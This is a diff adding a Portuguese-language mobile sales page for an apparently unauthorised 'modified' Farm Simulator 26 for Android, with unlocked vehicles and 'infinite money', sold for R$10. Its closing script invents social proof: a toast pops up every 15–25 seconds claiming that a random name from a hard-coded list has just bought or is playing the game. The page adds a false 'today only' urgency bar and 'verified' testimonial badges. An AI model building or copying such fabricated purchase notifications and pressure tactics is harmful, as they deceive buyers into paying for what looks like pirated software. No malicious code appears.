+            color: var(--primary-yellow);
+            text-shadow: 0 0 5px rgba(255, 215, 0, 0.3);
+        }
+
+        .cta-wrapper {
+            margin-top: 30px;
+            text-align: center;
+        }
+
+        .guarantee-text {
+            display: inline-block;
+            margin-top: 12px;
+            padding: 8px 12px;
+            background: rgba(57, 255, 20, 0.08);
+            border: 1px solid rgba(57, 255, 20, 0.25);
+            border-radius: 6px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            color: var(--neon-green);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            line-height: 1.4;
+        }
+
+        /* ===== DIVIDER ===== */
+        .section-divider {
+            width: 60px;
+            height: 3px;
+            background: linear-gradient(90deg, var(--neon-green), var(--primary-yellow));
+            border-radius: 2px;
+            margin: 0 auto 15px auto;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="mobile-wrapper">
+
+        <!-- URGENCY BAR -->
+        <div class="urgency-bar">
+            ⚡ Oferta relâmpago — válida apenas HOJE 24/10/2026
+        </div>
+
+        <!-- HERO -->
+        <div class="hero-section">
+            <div class="hero-title">
+                <h1>FARM SIMULATOR 26 <span class="highlight">NO SEU CELULAR FRACO!</span></h1>
+                <p class="hero-subtitle">Pilote tratores, plante lavouras, colha safras e administre sua fazenda com
+                    <strong>mods brasileiros exclusivos</strong>, tudo liberado e 100% otimizado.</p>
+                <span class="badge">🚜 Versão Modificada Mobile</span>
+            </div>
+
+            <!-- HERO VIDEO -->
+            <div class="video-box" style="margin-top: 15px;">
+                <vturb-smartplayer id="vid-6add4fe676c006ae29508611" style="display: block; margin: 0 auto; width: 100%; "><div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 45% 0 0; z-index: 0; background-color: black;"></div></vturb-smartplayer>
+                <script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/dc0b30cd-bba0-4a49-a342-1ea0d06e65a9/players/6add4fe676c006ae29508611/v4/player.js", s.async=!0,document.head.appendChild(s); </script>
+            </div>
+        </div>
+
+        <!-- CONTENT -->
+        <div class="content">
+
+            <!-- SEÇÃO PASSO A PASSO (COMPROU, BAIXOU, JOGOU!) -->
+            <div class="steps-section">
+                <div class="steps-badge">
+                    <span>🚜</span> PASSO A PASSO
+                </div>
+                <h2 class="steps-title">COMPROU, BAIXOU, <span class="highlight-step">JOGOU!</span></h2>
+                <p class="steps-subtitle">Veja como é simples e rápido começar a jogar no celular.</p>
+
+                <div class="steps-grid">
+                    <!-- PASSO 01 -->
+                    <div class="step-card">
+                        <div class="step-num">01</div>
+                        <div class="step-img-box">
+                            <img src="https://i.imgur.com/AakT1Sa.jpg" alt="Passo 1: Receba o Link" loading="lazy" referrerpolicy="no-referrer" onerror="this.onerror=null; this.src='AakT1Sa.jpg';">
+                        </div>
+                        <h3 class="step-card-title">RECEBA O LINK</h3>
+                        <p class="step-card-desc">Pagamento aprovado na hora via PIX ou cartão. Você recebe o link exclusivo direto no seu e-mail e WhatsApp em segundos.</p>
+                    </div>
+
+                    <!-- PASSO 02 -->
+                    <div class="step-card">
+                        <div class="step-num">02</div>
+                        <div class="step-img-box">
+                            <img src="https://i.imgur.com/CmcOJqa.jpg" alt="Passo 2: Instale o Jogo" loading="lazy" referrerpolicy="no-referrer" onerror="this.onerror=null; this.src='CmcOJqa.jpg';">
+                        </div>
+                        <h3 class="step-card-title">INSTALE O JOGO</h3>
+                        <p class="step-card-desc">Download rápido e 100% seguro. Basta baixar e seguir o instalador guiado direto pelo celular, sem precisar de PC.</p>
+                    </div>
+
+                    <!-- PASSO 03 -->
+                    <div class="step-card">
+                        <div class="step-num">03</div>
+                        <div class="step-img-box">
+                            <img src="https://i.imgur.com/Z2Y2JaR.jpg" alt="Passo 3: Comece a Jogar!" loading="lazy" referrerpolicy="no-referrer" onerror="this.onerror=null; this.src='Z2Y2JaR.jpg';">
+                        </div>
+                        <h3 class="step-card-title">COMECE A JOGAR!</h3>
+                        <p class="step-card-desc">Abra o FS26 com dinheiro infinito, mods brasileiros e tratores liberados para cuidar da sua fazenda onde quiser!</p>
+                    </div>
+                </div>
+
+                <div class="steps-footer-note">
+                    <span class="check-icon">✓</span> Acesso digital imediato após a confirmação do pagamento
+                </div>
+            </div>
+
+            <!-- SUPER CARD (como EuroTruck) -->
+            <div class="offer-card">
+                <h2 class="offer-card-title">FS26 PARA CELULAR MOBILE 📱</h2>
+
+                <div class="carousel">
+                    <div class="carousel-item">
+                        <img src="https://i.imgur.com/CYybxCG.jpg" alt="FS26 Imagem 1" loading="lazy" referrerpolicy="no-referrer" onerror="this.onerror=null; this.src='CYybxCG.jpg';">
+                    </div>
+                    <div class="carousel-item">
+                        <img src="https://i.imgur.com/SYT9yx2.jpg" alt="FS26 Imagem 2" loading="lazy" referrerpolicy="no-referrer" onerror="this.onerror=null; this.src='SYT9yx2.jpg';">
+                    </div>
+                    <div class="carousel-item">
+                        <img src="https://i.imgur.com/nRFCEjI.jpg" alt="FS26 Imagem 3" loading="lazy" referrerpolicy="no-referrer" onerror="this.onerror=null; this.src='nRFCEjI.jpg';">
+                    </div>
+                    <div class="carousel-item">
+                        <img src="https://i.imgur.com/eWYaQjE.jpg" alt="FS26 Imagem 4" loading="lazy" referrerpolicy="no-referrer" onerror="this.onerror=null; this.src='eWYaQjE.jpg';">
+                    </div>
+                    <div class="carousel-item">
+                        <img src="https://i.imgur.com/4hXWrCo.jpg" alt="FS26 Imagem 5" loading="lazy" referrerpolicy="no-referrer" onerror="this.onerror=null; this.src='4hXWrCo.jpg';">
+                    </div>
+                </div>
+
+                <ul class="benefits-list">
+                    <li><span class="icon">➜</span> Todos os tratores e colheitadeiras liberados</li>
+                    <li><span class="icon">➜</span> Mods brasileiros exclusivos instalados</li>
+                    <li><span class="icon">➜</span> Caminhões graneleiros e bi-trem extras</li>
+                    <li><span class="icon">➜</span> Mapas extras para explorar novas regiões</li>
+                    <li><span class="icon">➜</span> Campos abertos para plantar onde quiser</li>
+                    <li><span class="icon">➜</span> Sistema de construção e destruição</li>
+                    <li><span class="icon">➜</span> Motosserra e lavadora de veículos</li>
+                    <li><span class="icon">➜</span> Fumaça no escapamento e buzina realista</li>
+                    <li><span class="icon">➜</span> Levantar e abaixar implementos acopláveis</li>
+                    <li><span class="icon">➜</span> ModHub adaptado — adicione mais mods</li>
+                    <li><span class="icon">➜</span> Controle otimizado para tela touch</li>
+                    <li><span class="icon">➜</span> Configurações de gráficos avançados</li>
+                    <li><span class="icon">➜</span> Tutorial de instalação passo a passo</li>
+                    <li class="bonus"><span class="icon">➜</span> *BÔNUS* Fazendas de Minas Gerais</li>
+                    <li class="bonus"><span class="icon">➜</span> *BÔNUS* Fazendas do Mato Grosso</li>
+                    <li class="bonus"><span class="icon">➜</span> *BÔNUS* Missão Soja pelo Brasil</li>
+                    <li class="bonus"><span class="icon">➜</span> *BÔNUS* Colheita de Cana-de-Açúcar</li>
+                    <li class="bonus"><span class="icon">➜</span> *BÔNUS* Aula ensinando a colocar ainda mais mods</li>
+                    <li><span class="icon">➜</span> Entrega imediata após o pagamento</li>
+                </ul>
+
+                <div class="cta-wrapper">
+                    <div class="price-tag">
+                        <span class="old-price">DE R$ 27,90</span>
+                        <span class="new-price">POR APENAS <span class="amount">R$ 10,00</span></span>
+                        <span class="guarantee-text">🛡️ GARANTIA INCONDICIONAL DE 7 DIAS E SUPORTE EM HORÁRIO COMERCIAL TODOS OS DIAS</span>
+                    </div>
+                    <a href="https://pay.gamesmobilebr.shop/checkout/v4/FYe0npPMMIbSwux79WxyLn" class="cta-button">Quero Jogar Agora</a>
+                    <span class="cta-subtext">🔒 Compra Segura • Acesso Imediato</span>
+                </div>
+            </div>
+
+            <!-- TESTIMONIALS (MARQUEE SOCIAL PROOF) -->
+            <div class="testimonials-section">
+                <div style="text-align:center; padding: 0 15px;">
+                    <div class="section-label"><span>🚜 FS26 Mobile</span></div>
+                    <h2 class="section-title">O que falam do <span class="accent">FS26</span></h2>
+                    <p style="color: var(--text-muted); font-size: 0.85rem; margin-top: -10px; margin-bottom: 15px;">Depoimentos reais de quem já está jogando no celular</p>
+                    <div class="section-divider"></div>
+                </div>
+
+                <div class="testimonials-marquee-wrapper">
+                    <div class="testimonials-marquee-track">
+                        <!-- Grupo 1 -->
+                        <div class="testimonials-marquee-group">
+                            <div class="testimonial-card" onclick="openProofLightbox('https://i.imgur.com/qMyZkpW.jpg')">
+                                <div class="testimonial-card-header">
+                                    <span class="stars">⭐⭐⭐⭐⭐</span>
+                                    <span class="verified-badge">✓ Verificado</span>
+                                </div>
+                                <div class="testimonial-img-box">
+                                    <img src="https://i.imgur.com/qMyZkpW.jpg" alt="Prova Social FS26 1" loading="lazy" referrerpolicy="no-referrer" onerror="this.onerror=null; this.src='qMyZkpW.jpg';">
+                                </div>
+                                <div class="testimonial-card-footer">
+                                    <span>🔍 Toque para ampliar</span>
+                                </div>
+                            </div>
+
+                            <div class="testimonial-card" onclick="openProofLightbox('https://i.imgur.com/nD3tsVu.jpg')">
+                                <div class="testimonial-card-header">
+                                    <span class="stars">⭐⭐⭐⭐⭐</span>
+                                    <span class="verified-badge">✓ Verificado</span>
+                                </div>
+                                <div class="testimonial-img-box">
+                                    <img src="https://i.imgur.com/nD3tsVu.jpg" alt="Prova Social FS26 2" loading="lazy" referrerpolicy="no-referrer" onerror="this.onerror=null; this.src='nD3tsVu.jpg';">
+                                </div>
+                                <div class="testimonial-card-footer">
+                                    <span>🔍 Toque para ampliar</span>
+                                </div>
+                            </div>
+
+                            <div class="testimonial-card" onclick="openProofLightbox('https://i.imgur.com/IHXPLAS.jpg')">
+                                <div class="testimonial-card-header">
+                                    <span class="stars">⭐⭐⭐⭐⭐</span>
+                                    <span class="verified-badge">✓ Verificado</span>
+                                </div>
+                                <div class="testimonial-img-box">
+                                    <img src="https://i.imgur.com/IHXPLAS.jpg" alt="Prova Social FS26 3" loading="lazy" referrerpolicy="no-referrer" onerror="this.onerror=null; this.src='IHXPLAS.jpg';">
+                                </div>
+                                <div class="testimonial-card-footer">
+                                    <span>🔍 Toque para ampliar</span>
+                                </div>
+                            </div>
+
+                            <div class="testimonial-card" onclick="openProofLightbox('https://i.imgur.com/Y9zlojY.jpg')">
+                                <div class="testimonial-card-header">
+                                    <span class="stars">⭐⭐⭐⭐⭐</span>
+                                    <span class="verified-badge">✓ Verificado</span>
+                                </div>
+                                <div class="testimonial-img-box">
+                                    <img src="https://i.imgur.com/Y9zlojY.jpg" alt="Prova Social FS26 4" loading="lazy" referrerpolicy="no-referrer" onerror="this.onerror=null; this.src='Y9zlojY.jpg';">
+                                </div>
+                                <div class="testimonial-card-footer">
+                                    <span>🔍 Toque para ampliar</span>
+                                </div>
+                            </div>
+
+                            <div class="testimonial-card" onclick="openProofLightbox('https://i.imgur.com/toA2VBX.jpg')">
+                                <div class="testimonial-card-header">
+                                    <span class="stars">⭐⭐⭐⭐⭐</span>
+                                    <span class="verified-badge">✓ Verificado</span>
+                                </div>
+                                <div class="testimonial-img-box">
+                                    <img src="https://i.imgur.com/toA2VBX.jpg" alt="Prova Social FS26 5" loading="lazy" referrerpolicy="no-referrer" onerror="this.onerror=null; this.src='toA2VBX.jpg';">
+                                </div>
+                                <div class="testimonial-card-footer">
+                                    <span>🔍 Toque para ampliar</span>
+                                </div>
+                            </div>
+
+                            <div class="testimonial-card" onclick="openProofLightbox('https://i.imgur.com/3XeB3d3.jpg')">
+                                <div class="testimonial-card-header">
+                                    <span class="stars">⭐⭐⭐⭐⭐</span>
+                                    <span class="verified-badge">✓ Verificado</span>
+                                </div>
+                                <div class="testimonial-img-box">
+                                    <img src="https://i.imgur.com/3XeB3d3.jpg" alt="Prova Social FS26 6" loading="lazy" referrerpolicy="no-referrer" onerror="this.onerror=null; this.src='3XeB3d3.jpg';">
+                                </div>
+                                <div class="testimonial-card-footer">
+                                    <span>🔍 Toque para ampliar</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Grupo 2 (Loop Infinito Perfeito) -->
+                        <div class="testimonials-marquee-group" aria-hidden="true">
+                            <div class="testimonial-card" onclick="openProofLightbox('https://i.imgur.com/qMyZkpW.jpg')">
+                                <div class="testimonial-card-header">
+                                    <span class="stars">⭐⭐⭐⭐⭐</span>
+                                    <span class="verified-badge">✓ Verificado</span>
+                                </div>
+                                <div class="testimonial-img-box">
+                                    <img src="https://i.imgur.com/qMyZkpW.jpg" alt="Prova Social FS26 1" loading="lazy" referrerpolicy="no-referrer" onerror="this.onerror=null; this.src='qMyZkpW.jpg';">
+                                </div>
+                                <div class="testimonial-card-footer">
+                                    <span>🔍 Toque para ampliar</span>
+                                </div>
+                            </div>
+
+                            <div class="testimonial-card" onclick="openProofLightbox('https://i.imgur.com/nD3tsVu.jpg')">
+                                <div class="testimonial-card-header">
+                                    <span class="stars">⭐⭐⭐⭐⭐</span>
+                                    <span class="verified-badge">✓ Verificado</span>
+                                </div>
+                                <div class="testimonial-img-box">
+                                    <img src="https://i.imgur.com/nD3tsVu.jpg" alt="Prova Social FS26 2" loading="lazy" referrerpolicy="no-referrer" onerror="this.onerror=null; this.src='nD3tsVu.jpg';">
+                                </div>
+                                <div class="testimonial-card-footer">
+                                    <span>🔍 Toque para ampliar</span>
+                                </div>
+                            </div>
+
+                            <div class="testimonial-card" onclick="openProofLightbox('https://i.imgur.com/IHXPLAS.jpg')">
+                                <div class="testimonial-card-header">
+                                    <span class="stars">⭐⭐⭐⭐⭐</span>
+                                    <span class="verified-badge">✓ Verificado</span>
+                                </div>
+                                <div class="testimonial-img-box">
+                                    <img src="https://i.imgur.com/IHXPLAS.jpg" alt="Prova Social FS26 3" loading="lazy" referrerpolicy="no-referrer" onerror="this.onerror=null; this.src='IHXPLAS.jpg';">
+                                </div>
+                                <div class="testimonial-card-footer">
+                                    <span>🔍 Toque para ampliar</span>
+                                </div>
+                            </div>
+
+                            <div class="testimonial-card" onclick="openProofLightbox('https://i.imgur.com/Y9zlojY.jpg')">
+                                <div class="testimonial-card-header">
+                                    <span class="stars">⭐⭐⭐⭐⭐</span>
+                                    <span class="verified-badge">✓ Verificado</span>
+                                </div>
+                                <div class="testimonial-img-box">
+                                    <img src="https://i.imgur.com/Y9zlojY.jpg" alt="Prova Social FS26 4" loading="lazy" referrerpolicy="no-referrer" onerror="this.onerror=null; this.src='Y9zlojY.jpg';">
+                                </div>
+                                <div class="testimonial-card-footer">
+                                    <span>🔍 Toque para ampliar</span>
+                                </div>
+                            </div>
+
+                            <div class="testimonial-card" onclick="openProofLightbox('https://i.imgur.com/toA2VBX.jpg')">
+                                <div class="testimonial-card-header">
+                                    <span class="stars">⭐⭐⭐⭐⭐</span>
+                                    <span class="verified-badge">✓ Verificado</span>
+                                </div>
+                                <div class="testimonial-img-box">
+                                    <img src="https://i.imgur.com/toA2VBX.jpg" alt="Prova Social FS26 5" loading="lazy" referrerpolicy="no-referrer" onerror="this.onerror=null; this.src='toA2VBX.jpg';">
+                                </div>
+                                <div class="testimonial-card-footer">
+                                    <span>🔍 Toque para ampliar</span>
+                                </div>
+                            </div>
+
+                            <div class="testimonial-card" onclick="openProofLightbox('https://i.imgur.com/3XeB3d3.jpg')">
+                                <div class="testimonial-card-header">
+                                    <span class="stars">⭐⭐⭐⭐⭐</span>
+                                    <span class="verified-badge">✓ Verificado</span>
+                                </div>
+                                <div class="testimonial-img-box">
+                                    <img src="https://i.imgur.com/3XeB3d3.jpg" alt="Prova Social FS26 6" loading="lazy" referrerpolicy="no-referrer" onerror="this.onerror=null; this.src='3XeB3d3.jpg';">
+                                </div>
+                                <div class="testimonial-card-footer">
+                                    <span>🔍 Toque para ampliar</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- FAQ -->
+        <div class="faq-section">
+            <h2 class="faq-title">Perguntas <span>Frequentes</span></h2>
+            <div class="faq-list">
+                <details class="faq-item">
+                    <summary class="faq-question">
+                        <span>📱 A instalação é complicada?</span>
+                        <span class="faq-icon">+</span>
+                    </summary>
+                    <div class="faq-answer">
+                        <strong>Nada disso!</strong> Você recebe um tutorial em vídeo que mostra cada etapa. Em menos
+                        de 5 minutos o jogo já estará rodando no seu celular. Se ainda assim tiver dúvida, nosso suporte
+                        te ajuda no WhatsApp.
+                    </div>
+                </details>
+
+                <details class="faq-item">
+                    <summary class="faq-question">
+                        <span>🌐 Funciona sem internet?</span>
+                        <span class="faq-icon">+</span>
+                    </summary>
+                    <div class="faq-answer">
+                        <strong>Sim!</strong> O FS26 roda <span class="highlight-green">100% offline</span>. Perfeito
+                        para jogar na roça, em viagens ou em qualquer lugar sem sinal. Você não precisa de Wi-Fi nem de
+                        dados móveis para se divertir.
+                    </div>
+                </details>
+
+                <details class="faq-item">
+                    <summary class="faq-question">
+                        <span>💻 Preciso de computador para instalar?</span>
+                        <span class="faq-icon">+</span>
+                    </summary>
+                    <div class="faq-answer">
+                        <strong>Não precisa!</strong> Todo o processo é feito direto pelo celular. Desde o download até
+                        a instalação, tudo acontece no seu Android sem precisar de PC, cabo ou nenhum outro aparelho.
+                    </div>
+                </details>
+
+                <details class="faq-item">
+                    <summary class="faq-question">
+                        <span>⏱️ Recebo na hora?</span>
+                        <span class="faq-icon">+</span>
+                    </summary>
+                    <div class="faq-answer">
+                        <strong>Imediatamente!</strong> Pagou via PIX ou cartão? O link de download aparece na tela e
+                        chega no seu e-mail em menos de 1 minuto. Pagamento único de <span
+                            class="highlight-green">R$ 10,00</span>, sem cobranças recorrentes.
+                    </div>
+                </details>
+
+                <details class="faq-item">
+                    <summary class="faq-question">
+                        <span>🧩 O jogo realmente vem com tudo modificado?</span>
+                        <span class="faq-icon">+</span>
+                    </summary>
+                    <div class="faq-answer">
+                        <strong>Sim, 100% modificado!</strong> Dinheiro infinito, todos os veículos liberados, mods
+                        brasileiros instalados, mapas extras e muito mais. Você abre o jogo e já tem acesso a tudo —
+                        sem precisar configurar nada por conta própria.
+                    </div>
+                </details>
+
+                <details class="faq-item">
+                    <summary class="faq-question">
+                        <span>🔒 É confiável?</span>
+                        <span class="faq-icon">+</span>
+                    </summary>
+                    <div class="faq-answer">
+                        <strong>Totalmente.</strong> Mais de milhares de jogadores já baixaram e estão curtindo. Além
+                        disso, você tem <span class="highlight-green">7 dias de garantia incondicional</span> — se não
+                        gostar, devolvemos 100% do valor sem perguntas.
+                    </div>
+                </details>
+
+                <details class="faq-item">
+                    <summary class="faq-question">
+                        <span>📲 Funciona em qualquer celular Android?</span>
+                        <span class="faq-icon">+</span>
+                    </summary>
+                    <div class="faq-answer">
+                        <strong>Funciona na grande maioria!</strong> O jogo é compatível com Android 8.0 ou superior.
+                        Roda bem em aparelhos Samsung, Motorola, Xiaomi, Realme, Poco e muitos outros. Se tiver dúvida
+                        sobre o seu modelo, é só perguntar no suporte antes de comprar.
+                    </div>
+                </details>
+            </div>
+        </div>
+
+        <!-- GUARANTEE -->
+        <div style="padding: 30px 15px;">
+            <div class="guarantee-card">
+                <span class="shield">🛡️</span>
+                <h3>Garantia blindada de 7 dias</h3>
+                <p>Baixou, testou e não curtiu? Sem problema. Basta chamar o suporte e devolvemos
+                    <strong>100% do seu dinheiro</strong> — sem burocracia, sem perguntas, sem letras miúdas.</p>
+            </div>
+        </div>
+
+
+        <!-- FOOTER -->
+        <div class="footer-trust">
+            Produto Verificado • Suporte Humanizado • Acesso Imediato
+        </div>
+    </div>
+
+    <script>
+        // Carousel click-to-scroll
+        document.querySelectorAll('.carousel .carousel-item').forEach(item => {
+            item.addEventListener('click', (e) => {
+                const carousel = e.target.closest('.carousel');
+                const scrollAmount = item.offsetWidth + 15;
+                if (carousel.scrollLeft + carousel.offsetWidth >= carousel.scrollWidth - 10) {
+                    carousel.scrollTo({ left: 0, behavior: 'smooth' });
+                } else {
+                    carousel.scrollBy({ left: scrollAmount, behavior: 'smooth' });
+                }
+            });
+        });
+
+        // Social Proof Toast
+        const names = [
+            "Carlos Silva", "João Pedro", "Lucas Santos", "Rafael Oliveira", "Marcos Souza",
+            "Gabriel Pereira", "Felipe Rodrigues", "Bruno Alves", "Daniel Costa", "Thiago Lima",
+            "Mateus Ferreira", "Gustavo Ribeiro", "Anderson Mendes", "Leandro Campos", "Rodrigo Nunes"
+        ];
+
+        const actions = [
+            "acabou de baixar o FS26! 🚜",
+            "já está plantando no FS26! 🌱",
+            "está pilotando um trator no FS26! 🚜",
+            "comprou o FS26 agora! ✅",
+            "já está jogando FS26 no celular! 📱"
+        ];
+
+        const toast = document.createElement('div');
+        toast.className = 'social-toast';
+        toast.innerHTML = `
+            <div class="toast-dot"></div>
+            <p class="toast-text"><strong id="toast-name">Nome</strong> <span id="toast-action">ação</span></p>
+        `;
+        document.body.appendChild(toast);
+
+        const nameEl = toast.querySelector('#toast-name');
+        const actionEl = toast.querySelector('#toast-action');
+
+        function showRandomNotification() {
+            nameEl.textContent = names[Math.floor(Math.random() * names.length)];
+            actionEl.textContent = actions[Math.floor(Math.random() * actions.length)];
+            toast.classList.add('active');
+            setTimeout(() => toast.classList.remove('active'), 4000);
+        }
+
+        setTimeout(() => {
+            showRandomNotification();
+            setInterval(showRandomNotification, 15000 + Math.random() * 10000);
+        }, 5000);
+
+        // UTM forwarding
+        function forwardUTMs() {
+            const currentParams = new URLSearchParams(window.location.search);
+            const commonKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'src', 'sck', 'xcod', 'fbclid', 'gclid'];
+
+            currentParams.forEach((val, key) => {
+                try { sessionStorage.setItem('utm_' + key, val); } catch (e) { }
+            });
+
+            commonKeys.forEach(key => {
+                if (!currentParams.has(key)) {
+                    try {
+                        const saved = sessionStorage.getItem('utm_' + key);
+                        if (saved) currentParams.set(key, saved);
+                    } catch (e) { }
+                }
+            });
+
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const k = sessionStorage.key(i);
+                    if (k && k.startsWith('utm_')) {
+                        const originalKey = k.replace(/^utm_/, '');
+                        if (!currentParams.has(originalKey)) {
+                            const val = sessionStorage.getItem(k);
+                            if (val) currentParams.set(originalKey, val);
+                        }
+                    }
+                }
+            } catch (e) { }
+
+            if ([...currentParams.keys()].length === 0) return;
+
+            document.querySelectorAll('a[href*="checkout"], a[href*="gamesmobilebr"], a[href*="lowify"], a.cta-button').forEach(link => {
+                try {
+                    const url = new URL(link.href, window.location.origin);
+                    currentParams.forEach((value, key) => {
+                        url.searchParams.set(key, value);
+                    });
+                    link.href = url.toString();
+                } catch (e) {
+                    const sep = link.href.indexOf('?') !== -1 ? '&' : '?';
+                    link.href = link.href + sep + currentParams.toString();
+                }
+            });
+        }
+
+        forwardUTMs();
+        document.addEventListener('DOMContentLoaded', forwardUTMs);
+        window.addEventListener('load', forwardUTMs);
+        document.addEventListener('click', function (e) {
+            const link = e.target.closest('a[href*="checkout"], a[href*="gamesmobilebr"], a[href*="lowify"], a.cta-button');
+            if (link) forwardUTMs();
+        }, true);
+
+        // Lightbox Provas Sociais
+        function openProofLightbox(src) {
+            const lb = document.getElementById('proofLightbox');
+            const img = document.getElementById('proofLightboxImg');
+            if (lb && img) {
+                img.src = src;
+                lb.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            }
+        }
+
+        function closeProofLightbox(e) {
+            if (e) e.stopPropagation();
+            const lb = document.getElementById('proofLightbox');
+            if (lb) {
+                lb.classList.remove('active');
+                document.body.style.overflow = '';
+            }
+        }
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') closeProofLightbox();
+        });
+    </script>
+
+    <!-- Modal Lightbox para Provas Sociais -->
+    <div id="proofLightbox" class="proof-lightbox" onclick="closeProofLightbox(event)">
+        <div class="proof-lightbox-content" onclick="event.stopPropagation()">
+            <button class="proof-lightbox-close" onclick="closeProofLightbox(event)" aria-label="Fechar">&times;</button>
+            <img id="proofLightboxImg" src="" alt="Print Prova Social FS26" onerror="this.onerror=null; const p = this.src.split('/').pop(); if (p) this.src = p;">
+        </div>
+    </div>
+</body>
+
+</html>
